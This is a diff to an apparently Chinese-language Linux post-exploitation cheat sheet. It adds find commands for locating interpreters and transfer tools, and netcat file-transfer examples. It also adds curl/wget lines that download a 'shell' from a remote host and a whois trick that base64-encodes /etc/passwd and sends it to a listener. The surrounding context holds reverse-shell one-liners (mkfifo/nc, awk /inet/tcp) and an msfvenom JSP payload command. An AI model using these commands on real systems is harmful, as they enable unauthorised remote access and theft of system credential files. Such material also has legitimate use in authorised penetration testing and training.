@@ -8,11 +8,6 @@
 
 ---
 
-**渗透框架**
-- [d4rk007/RedGhost](https://github.com/d4rk007/RedGhost) - linux 的后渗透框架,可用于权限维持、提权等操作，半图形化.实际测试感觉不太行。
-
----
-
 # 漏洞利用
 
 - [OS-Exploits](./OS-Exploits.md#Linux)
@@ -23,8 +18,29 @@
 
 `Living Off The Land`
 
+**相关文章**
+- [busybox docker 受限环境下回传文件](https://landgrey.me/blog/3/)
+
 **相关资源**
 - [GTFOBins](https://gtfobins.github.io/)
+
+**查看语言/代码支持情况**
+```bash
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+```
+
+**查找可利用于传输文件的命令**
+```bash
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+find / -name scp
+```
 
 **相关工具**
 - [sameera-madushan/Print-My-Shell](https://github.com/sameera-madushan/Print-My-Shell) - 自动化生成各种类型的反向 Shell
@@ -89,6 +105,16 @@ Static socat binary can be found at [https://github.com/andrew-d/static-binaries
     export TERM=xterm
     ```
 
+- **文件传输**
+    ```bash
+    # 收
+    nc -nvlp 4444 > aaa
+    ```
+    ```bash
+    # 发
+    nc -nv 192.168.30.35 4444 </usr/share/aaa    # kali
+    ```
+
 **ncat**
 ```bash
 # 被控端
@@ -110,6 +136,16 @@ nc -c bash 10.0.0.1 4242
 **Netcat OpenBsd**
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+**curl**
+```bash
+curl http://1.1.1.1/shell
+```
+
+**wget**
+```bash
+wget http://1.1.1.1/shell
 ```
 
 **perl**
@@ -237,6 +273,18 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 ```java
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
+```
+
+**whois**
+
+接收端
+```
+nc -vlnp 1337 | sed "s/ //g" | base64 -d
+```
+
+发送端
+```
+whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64`
 ```
 
 ---
